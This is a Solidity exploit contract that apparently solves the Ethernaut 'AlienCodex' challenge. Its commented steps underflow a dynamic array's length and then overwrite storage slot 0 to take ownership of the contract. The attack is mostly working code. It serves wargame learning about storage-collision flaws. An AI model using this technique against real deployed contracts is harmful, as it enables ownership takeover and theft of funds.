// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

// 1. Attacker creates malicious contract.
contract AlienCodexAttack {
    AlienCodex alienCodexContract;

    constructor(address _alienCodexContract) public {
        alienCodexContract = AlienCodex(_alienCodexContract);
    }

    function attack() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        // 2. Attacker calls `make_contact()` function so that the `contact` is set to true. This will allow attacker to go through the `contacted()` modifier.
        alienCodexContract.make_contact();

        // 3. Attacker calls `retract()` function. This will decrease the `codex.length` by 1. He gets an underflow. This will change the `codex.length` to `2**256 -1` which is also the total storage capacity of the contract.
        alienCodexContract.retract();

        // 4. Attacker calls `revise()` function to access the array at slot 0 and update the value of the `_owner` with his own address.
        // 5. Attacker claims ownership of `AlienCodex` contract.
        alienCodexContract.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
